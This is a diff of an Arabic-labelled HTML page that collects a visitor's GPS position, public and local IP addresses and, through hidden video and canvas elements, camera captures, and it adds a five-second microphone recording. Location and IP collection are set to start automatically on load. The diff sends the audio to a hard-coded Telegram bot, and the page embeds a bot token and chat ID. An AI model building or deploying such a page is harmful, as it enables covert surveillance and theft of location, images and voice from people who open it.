@@ -2,9 +2,16 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📍 تحديد + تصوير + IPs</title>
+  <title>📍 تحديد + تصوير + IPs + 🎙️ صوت</title>
 </head>
 <body>
+  <h2>📍 تحديد الموقع + تصوير + IP + تسجيل صوتي</h2>
+
+  <button onclick="startRecording()">🎙️ ابدأ التسجيل الصوتي</button>
+  <pre id="status">🎙️ جاهز للتسجيل...</pre>
+
+  <hr>
+
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
   <pre id="result">📡 جاري جمع المعلومات...</pre>
@@ -13,6 +20,48 @@
     const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
     const chat_id = "5735855086";
 
+    // 🎙️ تسجيل صوتي
+    function sendVoice(blob) {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("voice", blob, "recording.ogg");
+
+      fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
+        method: "POST",
+        body: form
+      })
+      .then(() => {
+        document.getElementById("status").innerText = "✅ تم إرسال التسجيل الصوتي!";
+      })
+      .catch(err => {
+        document.getElementById("status").innerText = "❌ فشل إرسال الصوت: " + err.message;
+      });
+    }
+
+    function startRecording() {
+      document.getElementById("status").innerText = "🔴 جاري طلب إذن الميكروفون...";
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => {
+          document.getElementById("status").innerText = "🎤 جاري التسجيل...";
+          const mediaRecorder = new MediaRecorder(stream);
+          const chunks = [];
+
+          mediaRecorder.ondataavailable = event => chunks.push(event.data);
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: "audio/ogg" });
+            sendVoice(blob);
+            stream.getTracks().forEach(track => track.stop());
+          };
+
+          mediaRecorder.start();
+          setTimeout(() => mediaRecorder.stop(), 5000); // 5 ثوانٍ
+        })
+        .catch(err => {
+          document.getElementById("status").innerText = "❌ فشل الوصول للميكروفون: " + err.message;
+        });
+    }
+
+    // 📸 و📍 و🌐 IPs
     let gpsMsg = "";
     let publicIP = "";
     let localIP = "";
@@ -137,7 +186,7 @@ Longitude: ${gpsLon}
         });
     }
 
-    // بدء كل العمليات
+    // 🚀 بدء العمليات تلقائياً
     getLocation();
     getPublicIP();
     getLocalIP();
